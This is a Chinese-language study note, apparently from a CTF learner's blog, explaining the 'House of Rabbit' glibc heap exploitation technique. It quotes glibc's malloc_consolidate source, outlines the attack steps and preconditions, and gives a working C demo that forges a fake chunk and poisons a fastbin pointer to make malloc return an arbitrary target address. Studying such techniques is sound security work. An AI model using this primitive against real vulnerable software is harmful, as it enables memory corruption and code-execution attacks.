---
title: House of Rabbit
tags:
    - pwn
    - House of XXX
categories:
    - 学习笔记
cover: /img/达令.png
---
# House of Rabbit

## 前言
​哎呀，也不知道怎么说，看CTFshow上的poc总有一种无力感，啥玩意也没有。那个注释吧，也就是把how2heap的注释翻译了一下吧。真感觉他自己过个几年回来看自己的poc，估计也不知道是怎么利用吧。反正感觉写得莫名其妙，描述的语言逻辑不清楚。好在看雪上有一篇精华帖，写得很好，讲到了关键点。
​现在就是自己重新分析，改一下他的poc吧。

## 相关源码
**文件路径(malloc/malloc.c)**

### malloc_consolidate

```c
static void malloc_consolidate(mstate av)
{
  mfastbinptr*    fb;                 /* current fastbin being consolidated */
  mfastbinptr*    maxfb;              /* last fastbin (for loop control) */
  mchunkptr       p;                  /* current chunk being consolidated */
  mchunkptr       nextp;              /* next chunk to consolidate */
  mchunkptr       unsorted_bin;       /* bin header */
  mchunkptr       first_unsorted;     /* chunk to link to */

  /* These have same use as in free() */
  mchunkptr       nextchunk;
  INTERNAL_SIZE_T size;
  INTERNAL_SIZE_T nextsize;
  INTERNAL_SIZE_T prevsize;
  int             nextinuse;
  mchunkptr       bck;
  mchunkptr       fwd;

  /*
    If max_fast is 0, we know that av hasn't
    yet been initialized, in which case do so below
  */

  if (get_max_fast () != 0) {
    clear_fastchunks(av);

    unsorted_bin = unsorted_chunks(av);

    /*
      Remove each chunk from fast bin and consolidate it, placing it
      then in unsorted bin. Among other reasons for doing this,
      placing in unsorted bin avoids needing to calculate actual bins
      until malloc is sure that chunks aren't immediately going to be
      reused anyway.
    */

    maxfb = &fastbin (av, NFASTBINS - 1);
    fb = &fastbin (av, 0);
    do {
      p = atomic_exchange_acq (fb, 0);
      if (p != 0) {
	do {
	  check_inuse_chunk(av, p);
	  nextp = p->fd;

	  /* Slightly streamlined version of consolidation code in free() */
	  size = p->size & ~(PREV_INUSE|NON_MAIN_ARENA);
	  nextchunk = chunk_at_offset(p, size);
	  nextsize = chunksize(nextchunk);

	  if (!prev_inuse(p)) {
	    prevsize = p->prev_size;
	    size += prevsize;
	    p = chunk_at_offset(p, -((long) prevsize));
	    unlink(av, p, bck, fwd);
	  }

	  if (nextchunk != av->top) {
	    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

	    if (!nextinuse) {
	      size += nextsize;
	      unlink(av, nextchunk, bck, fwd);
	    } else
	      clear_inuse_bit_at_offset(nextchunk, 0);

	    first_unsorted = unsorted_bin->fd;
	    unsorted_bin->fd = p;
	    first_unsorted->bk = p;

	    if (!in_smallbin_range (size)) {
	      p->fd_nextsize = NULL;
	      p->bk_nextsize = NULL;
	    }

	    set_head(p, size | PREV_INUSE);
	    p->bk = unsorted_bin;
	    p->fd = first_unsorted;
	    set_foot(p, size);
	  }

	  else {
	    size += nextsize;
	    set_head(p, size | PREV_INUSE);
	    av->top = p;
	  }

	} while ( (p = nextp) != 0);

      }
    } while (fb++ != maxfb);
  }
  else {
    malloc_init_state(av);
    check_malloc_state(av);
  }
}
```
1. 判断是否初始化.若未初始化，则初始化.
2. 将fastbins清空。遍历fastbins.
    - 向后合并(低地址),能合就合
    - 向前合并(高地址),能合就合
3. 如果合并后与topchunk相邻则合并入topchunk.
4. 否则插入到unsortedbin 前面.

## 相关调用
1. `_int_malloc()`中调用
    - 申请large chunk 时，且arena 存在fastbins chunk 触发
    - 申请small chunk时，victim==0时触发(错误处理)
2. `mtrim()`中调用
3. `__libc_mallopt()`中调用
4. `_int_free`中调用
    - 释放到unsortedbin进行consolidation的过程中，在向前向后合并完成了以后，如果合并后大小大于0xffff，就检测fastbin chunk并进行合并

## 利用思路和条件
### 思路(感觉更像流程)
1. 申请大堆块，增加av->system_mem和触发grow_heap . 使heap空间初始化与.bss等段空间相邻 .
2. 在想要分配的地址(设为target)附近伪造fake chunk(设为buf)，然后申请一个fastbins(设为a)大小的  ，一个smallbin(设为b)大小的chunk。
3. 先将a 放入fastbins 中，通过溢出或者uaf 漏洞，将buf链入fastbins 中。通过free掉b，触发malloc_consodilate,把 fastbins清空且插入unsorted bin。**因为a和b相邻所以都被合并到topchunk，而buf不相邻，所以会无法合并，而被插入到unsortedbin 中。**
4. 再次通过申请大堆块，把unosorted bin 放入large bin 中。当然，为了能成功的进入large bin，我们需要先修改buf的size在合理的范围。
5. 最后继续修改buf的size为0xfffffffffffffff1，再计算与target的偏移，申请偏移大小的堆块后，即可分配到target。
### 个人理解
1. 感觉关键在于第三步触发malloc_consodilate时，可以有一个把任意地址链入unsorted bin的机会。利用这个可以后续完成任意地址的分配。
2. 但是感觉前面的准备工作很多，第三步之后的部分和house of force 后续的手法差不多。一个是通过topchunk 与 target 的偏移；一个是利用large chunk 与 target 的偏移。
3. 如果按照上述流程的话，一开始就要申请两次大堆块。感觉有点明显（出题的话）。
4. 后续对fastbins chunk 合并时增加了检查，使得利用更加得困难。
### 条件
1. 首先就是对堆块的申请大小没有限制。在这个过程中，我们申请了极大的堆块，同时也有最小的堆块，如果堆块的大小被限制的话就很难搞。
2. 存在溢出漏洞，或者uaf。允许我们可以修改处于空闲状态的堆块的fd指针和size。
3. 中间不能有不能free的堆块。如果有自动申请的堆块，而且还不会被free，可能会卡我们位置。导致第三步的时候出现问题。（但感觉，有1,2 两点的话，应该也可以绕过。感觉加上这个应该会很好玩）。

## demo
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

char target[20]="hello world";
uint64_t  buf[20];
int main(){
    setbuf(stdin,NULL);
	setbuf(stdout,NULL);

    size_t* a;
    uint8_t* b;
    uint8_t* c;
    char* d;
    /*申请两次大堆块，并free*/
    a=malloc(0xa00000);
    printf("\033[1;33m第一步申请一个大堆块然后free，使system->mem提升:\033[0m\n");
    printf("第一次申请a，a的地址：%p\n",a-2);
    free(a);
    
    a=malloc(0xa00000);
    printf("\033[1;33m第二次继续申请一个大堆块，然后free，触发heap_grow:\033[0m\n");
    printf("第二次申请a，a的地址：%p\n\n",a-2);
    free(a);


    /*申请两个堆块，一个fastbins大小 ，一个smallbin大小*/
    printf("\033[1;33m此时申请一个fast chunk，一个small chunk为后续利用作铺垫:\033[0m\n");
    a=malloc(0x10);
    b=malloc(0x80);
    printf("fast chunk a: %p\n",a-2);
    printf("small chunk b: %p\n\n",b-0x10);
    
    /*
    用来链入large bin的fake chunk,注意从buf[1]~buf[5]是我们的fake chunk
    buf[0]是为了绕过_int_malloc中的检测，
    buf[7]是为了绕过_int_free时调用的consolidate的检测。
    */
    buf[0]=0xfffffffffffffff0;/*在检测中会用size+buf[2] 与size 比较，结果为0才能正确绕过*/
    buf[1]=0x0;
    buf[2]=0;
    buf[3]=0x21;
    buf[4]=0;
    buf[5]=0;
    buf[6]=0;
    buf[7]=1;  /*绕过malloc_consolidate 中的unlink操作*/
    printf("\033[1;33m伪造一个fake chunk，并为绕过一些检测，在某些地方埋伏笔\033[0m\n");
    printf("这是fake chunk--buf[2]的地址: %p\n",buf+2);
    printf("这是目标target的地址: %p\n",target);
    printf("\033[1;33m为了绕过检测而提前作的准备:\033[0m;\n");
    printf("buf[2]-0x10: %#lx\n",buf[0]);
    printf("buf[2]+0x28: %#lx\n",buf[7]);
    printf("buf[2]的size: %#lx\n\n",buf[3]);

    /*把a 放入fastbins ,把buf链入fastbin*/
    printf("\033[1;33m先free a,在通过修改a的fd，把buf[2]链入，随后free b触发:\033[0m\n");
    free(a);
    *a=(size_t)(&buf[2]);
    /*触发malloc_consolidate*/
    free(b);

    /*申请大堆块把buf放进largebin，修改buf size*/
    printf("\033[1;33m先修改buf 的size，使其可以被放入large bin中:\033[0m\n");
    buf[3]=0xa00001;
    b=malloc(0xa00000);
    printf("buf[2]的size: %#lx\n\n",buf[3]);
    /*再次修改size*/
    printf("\033[1;33m把buf 的size 修改为很大，使得可以分配到我们的target：\033[0m\n");
    buf[3]=0xfffffffffffffff1;
    /**/
    c=malloc(0xffffffffffffff80);
    d=malloc(0x10);
    printf("分配到的d:%p\n",d);
    printf("target: %p\n",target);
    return 0;
}
```
## 为什么fakechunk 后要设置1？
```c
if (!nextinuse) {
	      size += nextsize;
	      unlink(av, nextchunk, bck, fwd);
	    } else
	      clear_inuse_bit_at_offset(nextchunk, 0);
```
1. 这是因为后续free(b) ，触发malloc_consolidate,时会检测nextinuse。如果是0就会触发unlink，而我们的利用是不能走这条路的，所以为了绕过，就需要把nextinuse置1.
2. 同时因为这个绕过在前，所以我们先将fakechunk 的size设置为很小的0x20，这样置1的位置也很近，更方便。
3. 在检测中是nextinuse，因为我们的size为0。通过buf[6]+0，得到的还是buf[6]自己,所以只需要在这里置1就ok了.
## 为什么fakechunk前要置0xfffffffffffffff0？

![_int_malloc中的检测](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/d7c462933cf8847287b123a9d1dc54f5.png)

1. 在后续malloc(c)是，也就将largebin 迁移到target的调用中，有检测。就是[buf+size] -size，当这个结果为0 时，才能正常进行。
2. 因为我们将size设置为了0xfffffffffffffff0，所以[buf+size]要等于0xfffffffffffffff0。那么[buf+size]又是何处呢？
3. 其实就是buf-0x10。图中的r15，就是我们之前链入fastbins 的地址。

## 关键部分演示

### 把buf链入fastbins

![buf入fastbins](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630032850548.png)

### free b触发malloc_consolidate

![触发malloc_consolidate](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630033107787.png)
### 把buf放入largebin

![image-20250630033400440](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630033400440.png)
因为大小不够，所以会被放入large bin

### malloc，迁移largebins

![image-20250630033528949](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630033528949.png)
1. 这次大小足够了可以分配
2. 这个偏移计算是$[（target-0x10）-buf]-0x10$

### 分配target

![image-20250630034203589](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630034203589.png)
下一步就可以分配到target了